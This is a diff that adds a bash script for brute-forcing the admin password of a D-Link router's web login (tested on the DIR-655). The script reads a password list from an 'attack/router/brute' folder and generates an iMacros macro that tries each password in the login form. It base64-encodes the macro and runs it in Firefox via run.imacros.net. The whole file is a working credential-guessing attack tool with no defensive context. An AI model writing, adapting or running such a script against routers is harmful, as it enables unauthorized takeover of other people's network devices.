@@ -1,0 +1,55 @@
+#!/bin/bash
+set -x
+
+# Usage
+# $0 gateway
+# ./dlink 192.168.0.1
+
+# Tested on Dlink dir-655
+if [ ! -d /tmp/menu ] ; then mkdir /tmp/menu ; fi
+
+pass_list="/root/Desktop/current/attack/router/brute/short_list"
+gateway="$1"
+
+#  Macro header and blank password are put in first
+echo "VERSION BUILD=7601105 RECORDER=FX
+TAB T=1
+URL GOTO=$gateway
+SET !ENCRYPTION NO
+TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/ ATTR=ID:old_password CONTENT=
+TAG POS=1 TYPE=INPUT:BUTTON FORM=ID:myform ATTR=NAME:Login&&VALUE:Log<SP>In
+ONDIALOG POS=1 BUTTON=OK CONTENT=
+TAG POS=1 TYPE=INPUT:BUTTON FORM=ID:myform ATTR=NAME:Login&&VALUE:Log<SP>In
+REFRESH" > /tmp/menu/macro.tmp
+
+# If list is too long the macro will not start
+      target=( $(cat "$pass_list") )
+for i in "${target[@]}"; do
+   echo "SET !ENCRYPTION NO
+TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/ ATTR=ID:old_password CONTENT=$i
+TAG POS=1 TYPE=INPUT:BUTTON FORM=ID:myform ATTR=NAME:Login&&VALUE:Log<SP>In
+ONDIALOG POS=1 BUTTON=OK CONTENT=
+TAG POS=1 TYPE=INPUT:BUTTON FORM=ID:myform ATTR=NAME:Login&&VALUE:Log<SP>In
+REFRESH" >> /tmp/menu/macro.tmp
+done
+
+imacro_code="$(cat /tmp/menu/macro.tmp)"
+
+echo "$imacro_code" | openssl enc -base64 > /tmp/tmp
+
+   sed '$!N;s/\n/ /' /tmp/tmp > /tmp/tmp1                    # Yeah I know - I don't Know how to use SED properly
+   sed '$!N;s/\n/ /' /tmp/tmp1 > /tmp/tmp                    # But it works
+   sed '$!N;s/\n/ /' /tmp/tmp > /tmp/tmp1
+   sed '$!N;s/\n/ /' /tmp/tmp1 > /tmp/tmp
+   sed '$!N;s/\n/ /' /tmp/tmp > /tmp/tmp1
+   sed '$!N;s/\n/ /' /tmp/tmp1 > /tmp/tmp
+   sed 's/ //g' /tmp/tmp > /tmp/tmp1                         # Removes blank spaces
+
+
+   code="$(cat /tmp/tmp1)"
+rm -rf /tmp/tmp1 /tmp/tmp
+firefox &                                           # Firefox needs to be open already for this to work
+
+sleep 2                                               # Increase this if Firefox fails to open fast enough
+firefox "http://run.imacros.net/?code=$code" &        # Runs the IMacro code
+exit 0
